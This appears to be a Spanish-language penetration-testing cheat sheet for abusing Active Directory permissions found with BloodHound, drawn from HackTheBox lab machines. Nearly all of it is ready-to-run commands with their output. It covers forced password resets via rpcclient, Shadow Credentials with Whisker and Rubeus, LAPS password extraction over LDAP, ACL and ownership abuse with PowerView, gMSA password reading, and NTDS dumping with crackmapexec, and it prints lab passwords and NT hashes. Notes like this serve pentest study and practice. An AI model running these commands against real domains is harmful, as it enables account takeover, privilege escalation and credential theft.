# BloodHound

### Uso de BloodHound-python
```null
bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c All
```

### Inicialización Neo4j
```null
sudo neo4j console
bloodhound &>/dev/null & disown
```

### SharpHound Inyector
```null
PS C:\Temp> .\SharpHound.exe -c All
```

## Abuso de ForceChangePassword

### Modificación de contraseña por RPC
```null
rpcclient -U blackfield/support 10.10.10.192
rpcclient $> setuserinfo audit2020 23 H@CKTHEB0X#
```

## Abuso AddKeyCredentialLink 

### Uso de Invoke-Whisker (Obtención Hash NT)

```null
PS C:\Temp> Invoke-Whisker -Command "add /target:sflowers"
```

```null
.\Rubeus.exe asktgt /user:sflowers /certificate:<CERTIFICATE>
```

## Abuso ReadLAPSPassword

```null
*Evil-WinRM* PS C:\Temp> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Temp> $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\Temp> $Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
*Evil-WinRM* PS C:\Temp> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -PrincipalIdentity 'JDgodd'
*Evil-WinRM* PS C:\Temp> Add-DomainGroupMember -Identity 'Core Staff' -Members 'JDgodd' -Credential $Cred
```

### Extraer credenciales de Administradores locales con LDAP

```null
ldapsearch -H ldap://10.10.11.158 -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base <DC=streamIO,DC=htb> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# DC, Domain Controllers, streamIO.htb
dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: 4)(6&h9+7]QY+o

# search reference
ref: ldap://ForestDnsZones.streamIO.htb/DC=ForestDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://DomainDnsZones.streamIO.htb/DC=DomainDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://streamIO.htb/CN=Configuration,DC=streamIO,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

## Abuso WriteOwner

### Crear objeto y modificar las ACLs

```null
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1 
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -Rights ResetPassword -PrincipalIdentity tom
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $SecPassword = ConvertTo-SecureString 'pwned123$!' -AsPlainText -Force             
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -Identity claire -AccountPassword $SecPassword 
```

## Abuso WriteDacl

### Agregar usuario a un grupo

```null
net group Backup_Admins claire /add
```


## Abuso ReadGMSAPassword

### Desde binario externo

```null
PS C:\Temp> .\GMSAPasswordReader.exe --accountname bir-adfs-gmsa --domainname search.htb
Calculating hashes for Current Value
[*] Input username             : BIR-ADFS-GMSA$
[*] Input domain               : SEARCH.HTB
[*] Salt                       : SEARCH.HTBBIR-ADFS-GMSA$
[*]       rc4_hmac             : E1E9FD9E46D0D747E1595167EEDCEC0F
[*]       aes128_cts_hmac_sha1 : BBCD2446765F390C680CDA31A9FC1783
[*]       aes256_cts_hmac_sha1 : ECAED51920F8677C5846154F69267FE4875543727C7032690016F7947A8A6F94
[*]       des_cbc_md5          : 3843029E088FB983
```

### Con Powershell

```null
PS C:\Temp> $gmsa = Get-ADServiceAccount -Identity 'bir-adfs-gmsa' -Properties 'msDS-ManagedPassword'
PS C:\Temp> $mp = $gmsa.'msDS-ManagedPassword'
PS C:\Temp> $pass = ConvertFrom-ADManagedPasswordBlob $mp
PS C:\Temp> ConvertTo-NTHash -Password $pass.SecureCurrentPassword 
e1e9fd9e46d0d747e1595167eedcec0f 
PS C:\Temp> ConvertFrom-ADManagedPasswordBlob $mp
```

```null
PS C:\Temp> $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
PS C:\Temp> $cred = New-Object System.Management.Automation.PSCredential('search.htb\bir-adfs-gmsa',$SecPass)
PS C:\Temp> Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
search\bir-adfs-gmsa$ 
```

## Abuso de GenericWrite

### Conversión a un usuario en Kerberoasteable

```null
*Evil-WinRM* PS C:\Users\sbauer\Documents> Get-AdUser jorden | Set-ADAccountControl  -doesnotrequirepreauth $true
```

## Abuso de DCSync

### Dumpear NTDS

```null
crackmapexec smb 10.10.10.103 -u 'mrlky' -p 'Football#7' --ntds
```

## Abuso de AddKeyCredentialLink

### Añadir Principal para crear unas Shadow Credentials

```null
PS C:\Temp> Invoke-Whisker -Command "add /target:sflowers"
```

Se ejecutará el Rubeus para obtener un hash NTLM y hacer PassTheHash

